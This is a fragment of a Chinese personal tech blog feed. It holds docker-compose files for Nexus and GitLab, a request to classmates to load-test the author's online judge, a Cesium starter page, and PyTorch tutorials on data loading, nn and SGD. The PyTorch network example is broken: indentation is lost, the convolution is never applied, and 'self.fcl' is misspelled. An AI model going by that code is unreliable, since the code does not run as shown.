    <content type="html"><![CDATA[<p><excerpt in="" index="" |="" 首页摘要=""><br>一些docker-compose-yml文件<br><a id="more"></a></excerpt></p><the rest="" of="" contents="" |="" 余下全文=""><h3 id="Nexcus"><a href="#Nexcus" class="headerlink" title="Nexcus"></a>Nexcus</h3><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">'3'</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line"><span class="attr">  nexus:</span></span><br><span class="line"><span class="attr">    restart:</span> <span class="string">always</span></span><br><span class="line"><span class="attr">    image:</span> <span class="string">sonatype/nexus3</span></span><br><span class="line"><span class="attr">    container_name:</span> <span class="string">nexus</span></span><br><span class="line"><span class="attr">    ports:</span></span><br><span class="line"><span class="bullet">      -</span> <span class="number">8081</span><span class="string">:8081</span></span><br><span class="line"><span class="attr">    volumes:</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">/usr/local/docker/nexus/data:/nexus-data</span></span><br></pre></td></tr></table></figure><h3 id="gitlab"><a href="#gitlab" class="headerlink" title="gitlab"></a>gitlab</h3><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">'3'</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line"><span class="attr">    web:</span></span><br><span class="line"><span class="attr">      image:</span> <span class="string">'gitlab/gitlab-ce'</span></span><br><span class="line"><span class="attr">      restart:</span> <span class="string">always</span></span><br><span class="line"><span class="attr">      hostname:</span> <span class="string">'120.79.234.127'</span></span><br><span class="line"><span class="attr">      environment:</span></span><br><span class="line"><span class="attr">        TZ:</span> <span class="string">'Asia/Shanghai'</span></span><br><span class="line"><span class="attr">        GITLAB_OMNIBUS_CONFIG:</span> <span class="string">|</span></span><br><span class="line"><span class="string">          external_url 'http://120.79.234.127:8080'</span></span><br><span class="line"><span class="string">          gitlab_rails['gitlab_shell_ssh_port'] = 2222</span></span><br><span class="line"><span class="string">          unicorn['port'] = 8888</span></span><br><span class="line"><span class="string">          nginx['listen_port'] = 8080</span></span><br><span class="line"><span class="string"></span><span class="attr">      ports:</span></span><br><span class="line"><span class="bullet">        -</span> <span class="string">'8080:8080'</span></span><br><span class="line"><span class="bullet">        -</span> <span class="string">'8443:443'</span></span><br><span class="line"><span class="bullet">        -</span> <span class="string">'2222:22'</span></span><br><span class="line"><span class="attr">      volumes:</span></span><br><span class="line"><span class="bullet">        -</span> <span class="string">/root/user/local/docker/gitlab/config:/etc/gitlab</span></span><br><span class="line"><span class="bullet">        -</span> <span class="string">/root/user/local/docker/gitlab/data:/var/opt/gitlab</span></span><br><span class="line"><span class="bullet">        -</span> <span class="string">/root/user/local/docker/gitlab/logs:/var/log/gitlab</span></span><br></pre></td></tr></table></figure></the>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;excerpt in=&quot;&quot; index=&quot;&quot; |=&quot;&quot; 首页摘要=&quot;&quot;&gt;&lt;br&gt;一些docker-compose-yml文件&lt;br&gt;&lt;/excerpt&gt;&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>服务器压力测试</title>
    <link href="http://runindark.com/2019/05/16/%E6%9C%8D%E5%8A%A1%E5%8E%8B%E5%8A%9B%E6%B5%8B%E8%AF%95%E6%95%99%E7%A8%8B/"/>
    <id>http://runindark.com/2019/05/16/服务压力测试教程/</id>
    <published>2019-05-16T10:05:49.702Z</published>
    <updated>2019-05-16T11:57:13.794Z</updated>
    
    <content type="html"><![CDATA[<p><excerpt in="" index="" |="" 首页摘要=""><br>对的就是这个，这个就是打开的教程<br><a id="more"></a></excerpt></p><the rest="" of="" contents="" |="" 余下全文=""><h3 id="1-进入IHT官方博客网站"><a href="#1-进入IHT官方博客网站" class="headerlink" title="1. 进入IHT官方博客网站"></a>1. 进入IHT官方博客网站</h3><p><a href="https://www.uscihtoj.com/" target="_blank" rel="noopener">https://www.uscihtoj.com/</a></p><h3 id="2-打开OJ网址"><a href="#2-打开OJ网址" class="headerlink" title="2. 打开OJ网址"></a>2. 打开OJ网址</h3><p><img src="/image/01.jpg" alt=""></p><h3 id="3-注册"><a href="#3-注册" class="headerlink" title="3. 注册"></a>3. 注册</h3><blockquote><p>只能用电脑，手机大多数是找不到这个的<br>注册之后就直接Login 登陆就行了<br><img src="/image/02.jpg" alt=""></p></blockquote><h3 id="4-点进测试"><a href="#4-点进测试" class="headerlink" title="4. 点进测试"></a>4. 点进测试</h3><blockquote><p>密码是:  ihttest<br>学长学姐直接进去随便找一段代码放进去，疯狂提交就是了<br>持续时间很短，大概疯狂提交2min左右<br>灰常感谢学长学姐的帮忙，很抱歉占用学长学姐的时间哈</p></blockquote><p><img src="/image/03.jpg" alt=""></p></the>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;excerpt in=&quot;&quot; index=&quot;&quot; |=&quot;&quot; 首页摘要=&quot;&quot;&gt;&lt;br&gt;对的就是这个，这个就是打开的教程&lt;br&gt;&lt;/excerpt&gt;&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Cesium构建项目</title>
    <link href="http://runindark.com/2019/05/14/Cesium/"/>
    <id>http://runindark.com/2019/05/14/Cesium/</id>
    <published>2019-05-14T08:33:45.687Z</published>
    <updated>2019-05-14T08:36:36.818Z</updated>
    
    <content type="html"><![CDATA[<p><excerpt in="" index="" |="" 首页摘要=""><br>官方链接<br>!()[<a href="https://cesium.com/docs/tutorials/getting-started/#your-first-app]" target="_blank" rel="noopener">https://cesium.com/docs/tutorials/getting-started/#your-first-app]</a><br><a id="more"></a></excerpt></p><the rest="" of="" contents="" |="" 余下全文=""><h2 id="第一个程序"><a href="#第一个程序" class="headerlink" title="第一个程序"></a>第一个程序</h2><ol><li>在Apps目录先创建文件 helloWorld.html</li><li>模板文件<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://cesiumjs.org/releases/1.57/Build/Cesium/Cesium.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">"https://cesiumjs.org/releases/1.57/Build/Cesium/Widgets/widgets.css"</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"cesiumContainer"</span> <span class="attr">style</span>=<span class="string">"width: 700px; height:400px"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">    Cesium.Ion.defaultAccessToken = 'your_access_token';</span></span><br><span class="line"><span class="undefined">    var viewer = new Cesium.Viewer('cesiumContainer');</span></span><br><span class="line"><span class="undefined">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ol></the>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;excerpt in=&quot;&quot; index=&quot;&quot; |=&quot;&quot; 首页摘要=&quot;&quot;&gt;&lt;br&gt;官方链接&lt;br&gt;!()[&lt;a href=&quot;https://cesium.com/docs/tutorials/getting-started/#your-first-app]&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://cesium.com/docs/tutorials/getting-started/#your-first-app]&lt;/a&gt;&lt;br&gt;&lt;/excerpt&gt;&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>数据加载和预处理</title>
    <link href="http://runindark.com/2019/04/29/pytorch-02-%E6%95%B0%E6%8D%AE%E7%9A%84%E5%8A%A0%E8%BD%BD%E5%92%8C%E9%A2%84%E5%A4%84%E7%90%86/"/>
    <id>http://runindark.com/2019/04/29/pytorch-02-数据的加载和预处理/</id>
    <published>2019-04-29T08:06:41.950Z</published>
    <updated>2019-05-14T08:33:07.915Z</updated>
    
    <content type="html"><![CDATA[<p><excerpt in="" index="" |="" 首页摘要=""><br><a href="https://github.com/zergtant/pytorch-handbook" target="_blank" rel="noopener">pytorm中文手册</a><br><a href="https://pytorch-cn.readthedocs.io/zh/latest/torchvision/torchvision-datasets/" target="_blank" rel="noopener">pytormAPI</a><br><a href="https://pytorch.org/" target="_blank" rel="noopener">pytorch官网</a><br><a href="https://zjcqoo.github.io/-----https://github.com/zergtant/pytorch-handbook" target="_blank" rel="noopener">pytorchCDN加速中文手册</a><br><a id="more"></a></excerpt></p><the rest="" of="" contents="" |="" 余下全文=""><h2 id="import-packages"><a href="#import-packages" class="headerlink" title="import packages"></a>import packages</h2><p>PyTorch通过torch.utils.data对一般常用的数据加载进行了封装，可以很容易地实现多线程数据预读和批量加载。 并且torchvision已经预先实现了常用图像数据集，包括前面使用过的CIFAR-10，ImageNet、COCO、MNIST、LSUN等数据集，可通过torchvision.datasets方便的调用<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">from</span> torch.utils.data <span class="keyword">import</span> Dataset</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br></pre></td></tr></table></figure></p><h2 id="Dataset"><a href="#Dataset" class="headerlink" title="Dataset"></a>Dataset</h2><p>Dataset是一个抽象类, 为了能够方便的读取，需要将要使用的数据包装为Dataset类。 自定义的Dataset需要继承它并且实现两个成员方法：</p><p><strong>getitem</strong>() 该方法定义用索引(0 到 len(self))获取一条数据或一个样本<br><strong>len</strong>() 该方法返回数据集的总长度</p><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#定义一个数据集</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BulldozerDataset</span><span class="params">(Dataset)</span>:</span></span><br><span class="line">    <span class="string">""" 数据集演示 """</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, csv_file)</span>:</span></span><br><span class="line">        <span class="string">"""实现初始化方法，在初始化的时候将数据读载入"""</span></span><br><span class="line">        self.df=pd.read_csv(csv_file)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__len__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">'''</span></span><br><span class="line"><span class="string">        返回df的长度</span></span><br><span class="line"><span class="string">        '''</span></span><br><span class="line">        <span class="keyword">return</span> len(self.df)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__getitem__</span><span class="params">(self, idx)</span>:</span></span><br><span class="line">        <span class="string">'''</span></span><br><span class="line"><span class="string">        根据 idx 返回一行数据</span></span><br><span class="line"><span class="string">        '''</span></span><br><span class="line">        <span class="keyword">return</span> self.df.iloc[idx].SalePrice</span><br><span class="line"></span><br><span class="line"> <span class="comment"># 至此，我们的数据集已经定义完成了，我们可以实例话一个对象访问他</span></span><br><span class="line">  ds_demo= BulldozerDataset(<span class="string">'median_benchmark.csv'</span>)</span><br><span class="line"> <span class="comment"># 实现了 __len__ 方法所以可以直接使用len获取数据总数</span></span><br><span class="line"> len(ds_demo)</span><br><span class="line"> <span class="comment"># 用索引可以直接访问对应的数据, 对应 __getitem__ 方法</span></span><br><span class="line"> ds_demo[<span class="number">0</span>]</span><br></pre></td></tr></table></figure><h2 id="数据装载器"><a href="#数据装载器" class="headerlink" title="数据装载器"></a>数据装载器</h2><p>DataLoader为我们提供了对Dataset的读取操作，常用参数有：batch_size(每个batch的大小), shuffle(是否进行shuffle操作), num_workers(加载数据的时候使用几个子进程)，下面做一个简单的操作<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">dl = torch.utils.data.DataLoader(ds_demo, batch_size=<span class="number">10</span>, shuffle=<span class="keyword">True</span>, num_workers=<span class="number">0</span>)</span><br><span class="line"><span class="comment"># DataLoader返回的是一个可迭代对象，我们可以使用迭代器分次获取数据</span></span><br><span class="line">idata=iter(dl)</span><br><span class="line">print(next(idata))</span><br></pre></td></tr></table></figure></p><h2 id="torchvision"><a href="#torchvision" class="headerlink" title="torchvision"></a>torchvision</h2><p>torchvision 是PyTorch中专门用来处理图像的库<br>torchvision.datasets<br>torchvision.datasets 可以理解为PyTorch团队自定义的dataset，这些dataset帮我们提前处理好了很多的图片数据集，我们拿来就可以直接使用：</p><p>· MNIST<br>· COCO<br>· Captions<br>· Detection<br>· LSUN<br>· ImageFolder<br>· Imagenet-12<br>· CIFAR<br>· STL10<br>· SVHN<br>· PhotoTour 我们可以直接使用，示例如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> torchvision.datasets <span class="keyword">as</span> datasets</span><br><span class="line">trainset = datasets.MNIST(root=<span class="string">'./data'</span>, <span class="comment"># 表示 MNIST 数据的加载的目录</span></span><br><span class="line">                                      train=<span class="keyword">True</span>,  <span class="comment"># 表示是否加载数据库的训练集，false的时候加载测试集</span></span><br><span class="line">                                      download=<span class="keyword">True</span>, <span class="comment"># 表示是否自动下载 MNIST 数据集</span></span><br><span class="line">                                      transform=<span class="keyword">None</span>) <span class="comment"># 表示是否需要对数据进行预处理，none为不进行预处理</span></span><br></pre></td></tr></table></figure></p><h3 id="torchvision-models"><a href="#torchvision-models" class="headerlink" title="torchvision.models"></a>torchvision.models</h3><p>torchvision不仅提供了常用图片数据集，还提供了训练好的模型，可以加载之后，直接使用，或者在进行迁移学习 torchvision.models模块的 子模块中包含以下模型结构。</p><p>· AlexNet<br>· VGG<br>· ResNet<br>· SqueezeNet<br>· DenseNet<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#我们直接可以使用训练好的模型，当然这个与datasets相同，都是需要从服务器下载的</span></span><br><span class="line"><span class="keyword">import</span> torchvision.models <span class="keyword">as</span> models</span><br><span class="line">resnet18 = models.resnet18(pretrained=<span class="keyword">True</span>)</span><br></pre></td></tr></table></figure></p><h3 id="torchvision-transforms"><a href="#torchvision-transforms" class="headerlink" title="torchvision.transforms"></a>torchvision.transforms</h3><p>ransforms 模块提供了一般的图像转换操作类，用作数据处理和数据增强</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> torchvision <span class="keyword">import</span> transforms <span class="keyword">as</span> transforms</span><br><span class="line">transform = transforms.Compose([</span><br><span class="line">    transforms.RandomCrop(<span class="number">32</span>, padding=<span class="number">4</span>),  <span class="comment">#先四周填充0，在把图像随机裁剪成32*32</span></span><br><span class="line">    transforms.RandomHorizontalFlip(),  <span class="comment">#图像一半的概率翻转，一半的概率不翻转</span></span><br><span class="line">    transforms.RandomRotation((<span class="number">-45</span>,<span class="number">45</span>)), <span class="comment">#随机旋转</span></span><br><span class="line">    transforms.ToTensor(),</span><br><span class="line">    transforms.Normalize((<span class="number">0.4914</span>, <span class="number">0.4822</span>, <span class="number">0.4465</span>), (<span class="number">0.229</span>, <span class="number">0.224</span>, <span class="number">0.225</span>)), <span class="comment">#R,G,B每层的归一化用到的均值和方差</span></span><br><span class="line">])</span><br></pre></td></tr></table></figure></the>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;excerpt in=&quot;&quot; index=&quot;&quot; |=&quot;&quot; 首页摘要=&quot;&quot;&gt;&lt;br&gt;&lt;a href=&quot;https://github.com/zergtant/pytorch-handbook&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;pytorm中文手册&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;https://pytorch-cn.readthedocs.io/zh/latest/torchvision/torchvision-datasets/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;pytormAPI&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;https://pytorch.org/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;pytorch官网&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;https://zjcqoo.github.io/-----https://github.com/zergtant/pytorch-handbook&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;pytorchCDN加速中文手册&lt;/a&gt;&lt;br&gt;&lt;/excerpt&gt;&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>神经网络包nn和优化器optm</title>
    <link href="http://runindark.com/2019/04/29/pytorch-01-%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E5%8C%85nn%E5%92%8C%E4%BC%98%E5%8C%96%E5%99%A8optm/"/>
    <id>http://runindark.com/2019/04/29/pytorch-01-神经网络包nn和优化器optm/</id>
    <published>2019-04-29T07:31:26.960Z</published>
    <updated>2019-04-29T08:04:37.908Z</updated>
    
    <content type="html"><![CDATA[<p><excerpt in="" index="" |="" 首页摘要=""><br><a href="https://github.com/zergtant/pytorch-handbook" target="_blank" rel="noopener">pytorm中文手册</a><br><a href="https://pytorch-cn.readthedocs.io/zh/latest/torchvision/torchvision-datasets/" target="_blank" rel="noopener">pytormAPI</a><br><a href="https://pytorch.org/" target="_blank" rel="noopener">pytorch官网</a><br><a href="https://zjcqoo.github.io/-----https://github.com/zergtant/pytorch-handbook" target="_blank" rel="noopener">pytorchCDN加速中文手册</a><br><a id="more"></a></excerpt></p><the rest="" of="" contents="" |="" 余下全文=""><h2 id="相关包引入"><a href="#相关包引入" class="headerlink" title="相关包引入"></a>相关包引入</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">import</span> torch.nn <span class="keyword">as</span> nn</span><br><span class="line"><span class="keyword">import</span> torch.nn.functional <span class="keyword">as</span> F</span><br></pre></td></tr></table></figure><ol><li>torch.nn是专门为神经网络设计的模块化接口,n构建于 Autograd之上，可用来定义和运行神经网络。</li><li>nn.functional，这个包中包含了神经网络中使用的一些常用函数，这些函数的特点是，不具有可学习的参数(如ReLU，pool，DropOut等)，这些函数可以放在构造函数中，也可以不放，但是这里建议不放</li></ol><h2 id="定义一个神经网络"><a href="#定义一个神经网络" class="headerlink" title="定义一个神经网络"></a>定义一个神经网络</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">import</span> torch.nn <span class="keyword">as</span> nn</span><br><span class="line"><span class="keyword">import</span> torch.nn.functional <span class="keyword">as</span> F</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义一个网络</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Net</span><span class="params">(nn.Module)</span>:</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">super(Net, self).__init__()</span><br><span class="line"><span class="comment"># 卷积层 '1'表示输入图片为单通道, '6'表示输出通道数，'3'表示卷积核为3*3</span></span><br><span class="line">self.conv1 = nn.Conv2d(<span class="number">1</span>,<span class="number">6</span>,<span class="number">3</span>)</span><br><span class="line"><span class="comment"># 线性层，输入1350个特征，输出10个特征</span></span><br><span class="line">self.fc1 = nn.Linear(<span class="number">1350</span>,<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">forward</span><span class="params">(self, x)</span>:</span></span><br><span class="line">print(x.size())</span><br><span class="line"><span class="comment"># 结果：[1, 1, 32, 32]</span></span><br><span class="line"><span class="comment"># 卷积 -&gt; 激活 -&gt; 池化</span></span><br><span class="line"><span class="comment"># 卷积的尺寸计算公式后续??</span></span><br><span class="line">x = F.relu(x)</span><br><span class="line">print(x.size())</span><br><span class="line"><span class="comment"># 结果：[1, 6, 30, 30]</span></span><br><span class="line">x = F.max_pool2d(x,(<span class="number">2</span>,<span class="number">2</span>))</span><br><span class="line">x = F.relu(x)</span><br><span class="line">print(x.size())</span><br><span class="line"><span class="comment"># 结果：[1, 6, 15, 15]</span></span><br><span class="line">x = x.view(x.size()[<span class="number">0</span>],<span class="number">-1</span>)</span><br><span class="line"><span class="comment"># reshape，‘-1’表示自适应</span></span><br><span class="line">        <span class="comment">#这里做的就是压扁的操作 就是把后面的[1, 6, 15, 15]压扁，变为 [1, 1350]</span></span><br><span class="line">print(x.size())</span><br><span class="line">x = self.fcl(x)</span><br><span class="line"><span class="keyword">return</span> x ;</span><br><span class="line">net = Net()</span><br><span class="line">print(net)</span><br></pre></td></tr></table></figure><p>结果如下</p><blockquote><p>Net(<br>  (conv1): Conv2d(1, 6, kernel_size=(3, 3), stride=(1, 1))<br>  (fc1): Linear(in_features=1350, out_features=10, bias=True)<br>)</p></blockquote><h2 id="返回学习参数"><a href="#返回学习参数" class="headerlink" title="返回学习参数"></a>返回学习参数</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> parameter <span class="keyword">in</span> net.parameters():</span><br><span class="line">print(parameter)</span><br></pre></td></tr></table></figure><h2 id="返回可学习的参数及名称"><a href="#返回可学习的参数及名称" class="headerlink" title="返回可学习的参数及名称"></a>返回可学习的参数及名称</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> name,parameters <span class="keyword">in</span> net.named_parameters():</span><br><span class="line">    print(name,<span class="string">':'</span>,parameters.size())</span><br></pre></td></tr></table></figure><h2 id="反向传播"><a href="#反向传播" class="headerlink" title="反向传播"></a>反向传播</h2><ol><li>在反向传播前，先要将所有参数的梯度清零</li><li>torch.nn只支持mini-batches，不支持一次只输入一个样本，即一次必须是一个batch。<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net.zero_grad() </span><br><span class="line">out.backward(torch.ones(<span class="number">1</span>,<span class="number">10</span>))</span><br></pre></td></tr></table></figure></li></ol><h2 id="损失函数"><a href="#损失函数" class="headerlink" title="损失函数"></a>损失函数</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">y = torch.arange(<span class="number">0</span>,<span class="number">10</span>).view(<span class="number">1</span>,<span class="number">10</span>).float()</span><br><span class="line">criterion = nn.MSELoss()</span><br><span class="line">loss = criterion(out, y)</span><br><span class="line"><span class="comment">#loss是个scalar，我们可以直接用item获取到他的python类型的数值</span></span><br><span class="line">print(loss.item())</span><br></pre></td></tr></table></figure><h2 id="优化器"><a href="#优化器" class="headerlink" title="优化器"></a>优化器</h2><p>在反向传播计算完所有参数的梯度后，还需要使用优化方法来更新网络的权重和参数，例如随机梯度下降法(SGD)的更新策略如下：</p><p>weight = weight - learning_rate * gradient</p><p>在torch.optim中实现大多数的优化方法，例如RMSProp、Adam、SGD等，下面我们使用SGD做个简单的样例</p><h3 id="导optim包-amp-amp-代码"><a href="#导optim包-amp-amp-代码" class="headerlink" title="导optim包 &amp;&amp; 代码"></a>导optim包 &amp;&amp; 代码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> torch.optim</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">out = net(input) <span class="comment"># 这里调用的时候会打印出我们在forword函数中打印的x的大小</span></span><br><span class="line">criterion = nn.MSELoss()</span><br><span class="line">loss = criterion(out, y)</span><br><span class="line"><span class="comment">#新建一个优化器，SGD只需要要调整的参数和学习率</span></span><br><span class="line">optimizer = torch.optim.SGD(net.parameters(), lr = <span class="number">0.01</span>)</span><br><span class="line"><span class="comment"># 先梯度清零(与net.zero_grad()效果一样)</span></span><br><span class="line">optimizer.zero_grad() </span><br><span class="line">loss.backward()</span><br><span class="line"></span><br><span class="line"><span class="comment">#更新参数</span></span><br><span class="line">optimizer.step()</span><br></pre></td></tr></table></figure></the>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;excerpt in=&quot;&quot; index=&quot;&quot; |=&quot;&quot; 首页摘要=&quot;&quot;&gt;&lt;br&gt;&lt;a href=&quot;https://github.com/zergtant/pytorch-handbook&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;pytorm中文手册&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;https://pytorch-cn.readthedocs.io/zh/latest/torchvision/torchvision-datasets/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;pytormAPI&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;https://pytorch.org/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;pytorch官网&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;https://zjcqoo.github.io/-----https://github.com/zergtant/pytorch-handbook&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;pytorchCDN加速中文手册&lt;/a&gt;&lt;br&gt;&lt;/excerpt&gt;&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Pytorch</title>
    <link href="http://runindark.com/2019/04/19/test/"/>
    <id>http://runindark.com/2019/04/19/test/</id>
    <published>2019-04-18T17:48:06.844Z</published>
    <updated>2019-04-27T15:12:10.306Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://github.com/Runindark/Pytorch/blob/master/chapter2/2.1.1.pytorch-basics-tensor.ipynb" target="_blank" rel="noopener">https://github.com/Runindark/Pytorch/blob/master/chapter2/2.1.1.pytorch-basics-tensor.ipynb</a></p>]]></content>
    
    <summary type="html">
    
      
      
